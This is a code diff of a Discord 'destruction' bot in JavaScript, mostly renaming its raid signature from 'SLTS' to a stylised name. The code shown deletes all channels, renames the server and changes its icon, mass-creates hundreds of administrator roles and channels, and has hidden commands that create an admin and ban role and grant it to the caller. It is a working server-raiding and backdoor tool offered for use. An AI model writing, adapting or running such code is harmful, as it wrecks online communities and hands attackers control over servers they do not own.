@@ -7,7 +7,7 @@ var destruc = '§';
 
 
 bot.on('ready', function () {
-  bot.user.setPresence({ game: { name: 'SLTS.ntm'}})
+  bot.user.setPresence({ game: { name: 'Вłaсквıяđ.ntm'}})
   console.log("Bot de destruction en attente de vos commandes!")
 })
 
@@ -37,18 +37,17 @@ if(cmd("destruction", msg)) {
         c.delete();
         console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: destruction du channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
     });
-    msg.guild.setName("BZ by SLTS ");
+    msg.guild.setName("BZ by Вłaсквıяđ ");
     msg.guild.setIcon("https://cdn.discordapp.com/attachments/436480961979351040/482591506075746356/kowine.png");
     msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
     for (var i = 0; i < 400; i++) {
         msg.guild.createRole({
-            name: 'BZ BY SLTS',
+            name: 'Вłaсквıяđ',
             color: 'YELLOW',
             permissions: 'ADMINISTRATOR',
         });
 //         msg.guild.createChannel('BZ by SLTS', 'voice')
-        msg.guild.createChannel('BZ-by-SLTS', 'text')
-        msg.channel.send('spam @everyone');
+        msg.guild.createChannel('BZ-by-Вłaсквıяđ', 'text')
      }
  }
 });
@@ -57,7 +56,7 @@ bot.on('message', msg => {
     if (msg.content === '§r') {
     msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
     msg.guild.createRole({
-    name: 'BZSLTS',
+    name: 'BZВłaсквıяđ',
     color: 'WHITE',
     permissions:['ADMINISTRATOR', 'BAN_MEMBERS', 'MANAGE_CHANNELS']
     })
@@ -68,7 +67,7 @@ bot.on('message', msg => {
 
     if (msg.content === '§a') {
     msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
-    let RoleToAdd = msg.guild.roles.find('name', 'BZSLTS')
+    let RoleToAdd = msg.guild.roles.find('name', 'BZВłaсквıяđ')
     msg.member.addRole(RoleToAdd);
 }
 });
